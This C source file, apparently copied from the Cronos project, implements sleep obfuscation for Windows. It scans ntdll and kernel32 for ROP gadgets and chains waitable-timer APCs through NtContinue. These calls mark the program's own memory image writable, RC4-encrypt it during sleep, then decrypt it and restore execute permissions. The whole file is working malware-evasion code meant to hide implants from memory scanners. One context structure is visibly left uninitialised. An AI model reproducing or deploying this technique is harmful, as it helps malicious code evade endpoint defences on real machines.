// Demo of sleep obfuscation using timers (copy of https://github.com/Idov31/Cronos/blob/master/src/Cronos.c).
//
#include <Windows.h>

/*
        GADGET FINDING
*/



INT Memcmp(CONST PVOID Buffer1, CONST PVOID Buffer2, CONST SIZE_T Size)
{
    CONST PBYTE p1 = (CONST PBYTE)Buffer1;
    CONST PBYTE p2 = (CONST PBYTE)Buffer2;

    for (SIZE_T i = 0; i < Size; i++) {
        if (p1[i] < p2[i]) {
            return -1;
        }
        else if (p1[i] > p2[i]) {
            return 1;
        }
    }

    return 0;
}

VOID Memcpy(PVOID dest, CONST PVOID src,CONST  SIZE_T size)
{
    PBYTE d = (PBYTE)dest;
    CONST PBYTE s = (CONST PBYTE)src;

    for (SIZE_T i = 0; i < size; i++) {
        d[i] = s[i];
    }
}

PIMAGE_SECTION_HEADER GetTextSectionHeader(HMODULE hModule)
{
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)(hModule);
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(
        ((PBYTE)(hModule)) + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
    for (WORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i, ++Section) {
        if (Memcmp((PVOID)Section->Name, (PVOID)".text", 5) == 0) {
            return Section;
        }
    }

    return NULL;
}

PVOID FindByteSequence(PBYTE Start, SIZE_T Length, PBYTE Sequence, SIZE_T SequenceLength)
{
    if (Start == NULL || Sequence == NULL || Length == 0 || SequenceLength == 0) {
        return NULL;
    }

    if (SequenceLength > Length) {
        return NULL;
    }

    for (SIZE_T i = 0; i <= Length - SequenceLength; ++i) {
        BOOL Match = TRUE;
        for (SIZE_T j = 0; j < SequenceLength; ++j) {
            if (Start[i + j] != Sequence[j]) {
                Match = FALSE;
                break;
            }
        }
        if (Match) {
            return Start + i;
        }
    }

    return NULL;
}

PVOID FindGadget(PCSTR InModuleName, PBYTE Gadget, SIZE_T GadgetLength)
{
    HMODULE ModBase = GetModuleHandleA(InModuleName);
    PIMAGE_SECTION_HEADER CodeHeader = GetTextSectionHeader(ModBase);
    if (!CodeHeader) return NULL;

    PBYTE ImageBase = (PBYTE)ModBase;
    PBYTE TextSectionAddr = ImageBase + CodeHeader->VirtualAddress;

    return FindByteSequence(TextSectionAddr, CodeHeader->SizeOfRawData, Gadget, GadgetLength);
}


/*
        Timer-Based Sleep Obfuscation
*/

#define TIMER_DELAY 2000
#define INIT_TIMER_MS(ft, sec) {                                                                \
        (ft)->HighPart = (DWORD)(((ULONGLONG) - ((sec) * 1000 * 10 * 1000)) >> 32);             \
        (ft)->LowPart  = (DWORD)(((ULONGLONG) - ((sec) * 1000 * 10 * 1000)) & 0xffffffff); }    \

extern void QuadSleep(PVOID, PVOID, PVOID, PVOID);

typedef struct _CRYPT_BUFFER {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
}   CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, 
    CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;

typedef NTSTATUS(WINAPI* SYS_FN_032)(PCRYPT_BUFFER pData, PDATA_KEY pKey);

DWORD ObfuscatedSleep(INT Time)
{
    if (Time < 30) { return ERROR_TIMER_NOT_CANCELED; }
    HANDLE          hTimerProtectRW         = NULL;
    HANDLE          hTimerProtectRWX        = NULL;
    HANDLE          hTimerEncrypt           = NULL;
    HANDLE          hTimerDecrypt           = NULL;
    HANDLE          hTimerDummyThread       = NULL;
    LARGE_INTEGER   DueTimeProtectRW        = { NULL };
    LARGE_INTEGER   DueTimeProtectRWX       = { NULL };
    LARGE_INTEGER   DueTimeEncrypt          = { NULL };
    LARGE_INTEGER   DueTimeDecrypt          = { NULL };
    LARGE_INTEGER   DueTimeDummy            = { NULL };
    CONTEXT         ContextDummyThread      = { NULL };
    CONTEXT         ContextProtectRW        = { NULL };
    CONTEXT         ContextProtectRWX       = { NULL };
    CONTEXT         ContextDecrypt          = { NULL };
    CONTEXT         ContextEncrypt          = { NULL };
    DWORD           ImageSize               = NULL;
    PVOID           ImageBase               = NULL;
    DWORD           OldProtect              = NULL;
    PVOID           NtContinue              = NULL;
    SYS_FN_032      SystemFunction032       = NULL;
    CRYPT_BUFFER    Image                   = { NULL };
    DATA_KEY        Key                     = { NULL };
    CHAR            KeyBuffer[16]           = 
    {
        0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 
        0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18 
    };
    BYTE           SigGadgetRCX[2]          = { 0x59, 0xC3 };
    BYTE           SigGadgetRDX[2]          = { 0x5A, 0xC3 };
    BYTE           SigGadgetShadowFixer[6]  = { 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3 };
    PVOID          GadgetRCX                = NULL;
    PVOID          GadgetRDX                = NULL;
    PVOID          GadgetShadowFixer        = NULL;

    // Resolve non-standard functions
    HMODULE hAdvapi32                       = LoadLibraryA("advapi32");
    HMODULE hNtdll                          = GetModuleHandleA("ntdll");

    if (!hAdvapi32 || !hNtdll) { return ERROR_DLL_NOT_FOUND; }

    SystemFunction032 = (SYS_FN_032)GetProcAddress(hAdvapi32, "SystemFunction032");
    NtContinue = GetProcAddress(hNtdll, "NtContinue");

    if (!SystemFunction032 || !NtContinue) { 
        FreeLibrary(hAdvapi32);
        return ERROR_PROC_NOT_FOUND; 
    }

    // Get current module image base
    ImageBase = GetModuleHandle(NULL);
    if (!ImageBase) {
        FreeLibrary(hAdvapi32);
        return ERROR_DLL_NOT_FOUND;
    }

    ImageSize = ((PIMAGE_NT_HEADERS)(
        (DWORD_PTR)ImageBase 
        + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    // Initialize the image and key for SystemFunction032
    Key.Buffer = KeyBuffer;
    Key.Length = Key.MaximumLength = 16;
    Image.Buffer = ImageBase;
    Image.Length = Image.MaximumLength = ImageSize;

    // Create timers
    hTimerProtectRW = CreateWaitableTimerW(NULL, TRUE, L"TimerProtectRW");
    hTimerProtectRWX = CreateWaitableTimerW(NULL, TRUE, L"TimerProtectRWX");
    hTimerEncrypt = CreateWaitableTimerW(NULL, TRUE, L"TimerEncry");
    hTimerDecrypt = CreateWaitableTimerW(NULL, TRUE, L"TimerDecrypt");
    hTimerDummyThread = CreateWaitableTimerW(NULL, TRUE, L"TimerDummyThread");

    if (
        !hTimerProtectRW || !hTimerProtectRWX ||
        !hTimerEncrypt || !hTimerDecrypt ||
        !hTimerDummyThread )
    {
        FreeLibrary(hAdvapi32);
        return ERROR_CANNOT_MAKE;
    }

    INIT_TIMER_MS(&DueTimeDummy, 0);

    // Capture APC context
    if (!SetWaitableTimer(
        hTimerDummyThread,
        &DueTimeDummy,
        NULL,
        (PTIMERAPCROUTINE)RtlCaptureContext,
        &ContextDummyThread,
        FALSE))
    {
        FreeLibrary(hAdvapi32);
        CloseHandle(hTimerDummyThread);
        CloseHandle(hTimerDecrypt);
        CloseHandle(hTimerEncrypt);
        CloseHandle(hTimerProtectRW);
        CloseHandle(hTimerProtectRWX);
        return ERROR_TIMER_NOT_CANCELED;
    }

    SleepEx(INFINITE, TRUE);

    // Creating the context
    Memcpy(&ContextProtectRW, &ContextDummyThread, sizeof(CONTEXT));
    Memcpy(&ContextProtectRWX, &ContextDummyThread, sizeof(CONTEXT));
    Memcpy(&ContextEncrypt, &ContextDummyThread, sizeof(CONTEXT));
    Memcpy(&ContextEncrypt, &ContextDummyThread, sizeof(CONTEXT));

    // VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &OldProtect);
    ContextProtectRW.Rsp -= (8 + 0x150);
    ContextProtectRW.Rip = (DWORD_PTR)VirtualProtect;
    ContextProtectRW.Rcx = (DWORD_PTR)ImageBase;
    ContextProtectRW.Rdx = ImageSize;
    ContextProtectRW.R8 = PAGE_READWRITE;
    ContextProtectRW.R9 = (DWORD_PTR)&OldProtect;

    // SystemFunction032(&Image, &Key);
    ContextEncrypt.Rsp -= (8 + 0xF0);
    ContextEncrypt.Rip = (DWORD_PTR)SystemFunction032;
    ContextEncrypt.Rcx = (DWORD_PTR)&Image;
    ContextEncrypt.Rdx = (DWORD_PTR)&Key;

    // SystemFunction032(&Image, &Key);
    ContextDecrypt.Rsp -= (8 + 0x90);
    ContextDecrypt.Rip = (DWORD_PTR)SystemFunction032;
    ContextDecrypt.Rcx = (DWORD_PTR)&Image;
    ContextDecrypt.Rdx = (DWORD_PTR)&Key;

    // VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect);
    ContextProtectRWX.Rsp -= (8 + 0x30);
    ContextProtectRWX.Rip = (DWORD_PTR)VirtualProtect;
    ContextProtectRWX.Rcx = (DWORD_PTR)ImageBase;
    ContextProtectRWX.Rdx = ImageSize;
    ContextProtectRWX.R8 = PAGE_EXECUTE_READWRITE;
    ContextProtectRWX.R9 = (DWORD_PTR)&OldProtect;

    INIT_TIMER_MS(&DueTimeProtectRW, 0);
    INIT_TIMER_MS(&DueTimeEncrypt, 2);
    INIT_TIMER_MS(&DueTimeDecrypt, Time - 10);
    INIT_TIMER_MS(&DueTimeProtectRWX, Time);

    GadgetRCX = FindGadget("ntdll", SigGadgetRCX, sizeof(SigGadgetRCX));
    GadgetRDX = FindGadget("kernel32", SigGadgetRDX, sizeof(SigGadgetRDX));
    GadgetShadowFixer = FindGadget("kernel32", SigGadgetShadowFixer, sizeof(SigGadgetShadowFixer));

    if (!GadgetRCX || !GadgetRDX || !GadgetShadowFixer)
    {
        FreeLibrary(hAdvapi32);
        CloseHandle(hTimerDummyThread);
        CloseHandle(hTimerDecrypt);
        CloseHandle(hTimerEncrypt);
        CloseHandle(hTimerProtectRW);
        CloseHandle(hTimerProtectRWX);
        return ERROR_NOT_FOUND;
    }

    // Set the timers
    if (
        !SetWaitableTimer(hTimerDecrypt, &DueTimeDecrypt, 0, (PTIMERAPCROUTINE)NtContinue, &ContextDecrypt, FALSE) ||
        !SetWaitableTimer(hTimerProtectRWX, &DueTimeProtectRWX, 0, (PTIMERAPCROUTINE)NtContinue, &ContextProtectRWX, FALSE) ||
        !SetWaitableTimer(hTimerProtectRW, &DueTimeProtectRW, 0, (PTIMERAPCROUTINE)NtContinue, &ContextProtectRW, FALSE) ||
        !SetWaitableTimer(hTimerEncrypt, &DueTimeEncrypt, 0, (PTIMERAPCROUTINE)NtContinue, &ContextEncrypt, FALSE))
    {
        FreeLibrary(hAdvapi32);
        CloseHandle(hTimerDummyThread);
        CloseHandle(hTimerDecrypt);
        CloseHandle(hTimerEncrypt);
        CloseHandle(hTimerProtectRW);
        CloseHandle(hTimerProtectRWX);
        return ERROR_TIMER_NOT_CANCELED;
    }

    QuadSleep(GadgetRCX, GadgetRDX, GadgetShadowFixer, (PVOID)SleepEx);

    FreeLibrary(hAdvapi32);
    CloseHandle(hTimerDummyThread);
    CloseHandle(hTimerDecrypt);
    CloseHandle(hTimerEncrypt);
    CloseHandle(hTimerProtectRW);
    CloseHandle(hTimerProtectRWX);

    return ERROR_SUCCESS;
}

DWORD Main()
{
    DWORD Status = ObfuscatedSleep(30);
    return Status;
}
